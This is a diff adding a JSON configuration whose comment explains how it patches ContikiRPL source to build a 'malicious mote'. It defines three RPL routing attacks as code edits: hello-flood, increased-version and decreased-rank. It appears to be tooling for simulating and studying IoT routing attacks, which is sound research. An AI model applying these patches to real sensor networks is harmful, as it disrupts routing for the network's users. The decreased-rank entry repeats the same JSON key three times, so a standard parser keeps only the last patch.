@@ -1,0 +1,38 @@
+/*
+
+Building blocks consist of either ContikiRPL configuration constants or single-line based source code modifications,
+ e.g. :
+
+ "...": {
+   "RPL_CONF_DIO_INTERVAL_MIN": 1
+ }
+
+ will set the configuration constant RPL_CONF_DIO_INTERVAL_MIN to 1 at the beginning of the malicious mote's code
+
+ while
+
+ "...": {
+   "rpl-icmp6.c": ["dag->version;", "dag->version++;"]
+ }
+
+ will modify rpl-icmp6.c from the ContikiRPL library at line where "dag->version;" appears to "dag->version++;"
+
+ */
+
+{
+  "hello-flood": {
+    "RPL_CONF_DIS_INTERVAL": 0,
+    "RPL_CONF_DIS_START_DELAY": 0,
+    "rpl-timers.c": ["next_dis++;", "next_dis++; int i=0; while (i<20) {i++; dis_output(NULL);}"]
+  },
+  "increased-version": {
+    "rpl-icmp6.c": ["dag->version;", "dag->version++;"]
+
+  },
+  "decreased-rank": {
+    "rpl-private.h": ["#define RPL_MIN_HOPRANKINC          256", "#define RPL_MIN_HOPRANKINC          0"],
+    "rpl-private.h": ["#define RPL_MAX_RANKINC             (7 * RPL_MIN_HOPRANKINC)", "#define RPL_MAX_RANKINC             (0 * RPL_MIN_HOPRANKINC)"],
+    "rpl-private.h": ["#define INFINITE_RANK                   0xffff", "#define INFINITE_RANK                   256"],
+    "rpl-timers.c": ["rpl_recalculate_ranks();", null]
+  }
+}
